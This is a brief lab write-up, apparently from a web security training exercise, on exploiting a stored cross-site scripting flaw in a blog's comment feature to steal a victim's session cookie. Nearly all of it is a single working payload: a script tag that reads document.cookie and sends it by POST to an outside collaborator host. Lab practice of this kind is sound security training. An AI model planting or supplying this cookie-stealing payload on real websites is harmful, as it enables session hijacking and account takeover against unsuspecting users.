Lab #14 - Exploiting cross-site scripting to steal cookies

Target Goal - Exploit stored XSS vulnerability in the blog comment functionality to steal the vitim's session cookie.

Analysis:

<script>
fetch('https://ycepp9w39h7i7mervv12myumcdi46uuj.oastify.com', {
    method: 'POST',
    body: document.cookie,
    mode: 'no-cors'
});
</script>